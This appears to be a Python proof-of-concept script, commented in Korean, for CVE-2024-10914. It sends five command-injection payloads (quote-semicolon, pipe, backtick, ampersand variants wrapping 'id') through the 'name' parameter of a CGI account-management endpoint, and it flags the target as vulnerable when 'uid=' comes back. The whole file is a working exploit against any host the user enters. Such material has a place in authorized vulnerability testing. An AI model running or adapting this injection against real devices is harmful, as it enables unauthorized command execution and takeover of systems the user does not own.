# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_10914_varied_payloads(target):
    url = f"http://{target}/cgi-bin/account_mgr.cgi"
    payloads = [
        "';id;'",     # 작은따옴표 + 세미콜론
        "|id|",       # 파이프
        "`id`",       # 백틱
        "&id&",       # 앰퍼샌드
        '";id;"'      # 큰따옴표 + 세미콜론
    ]

    for payload in payloads:
        params = {
            "cmd": "cgi_user_add",
            "name": payload
        }
        try:
            print(f"[+] 페이로드 전송: name={payload}")
            response = requests.get(url, params=params, timeout=10)
            if "uid=" in response.text:
                print(f"[!] 취약점 가능성 발견! 페이로드: {payload}")
                print(response.text[:500])
                break
            else:
                print("[+] 명령어 실행 결과 미확인")
        except Exception as e:
            print("[!] 요청 오류:", e)


if __name__ == "__main__":
    target_ip = input("테스트할 대상 IP 또는 도메인 입력 >> ").strip()
    test_cve_2024_10914_varied_payloads(target_ip)
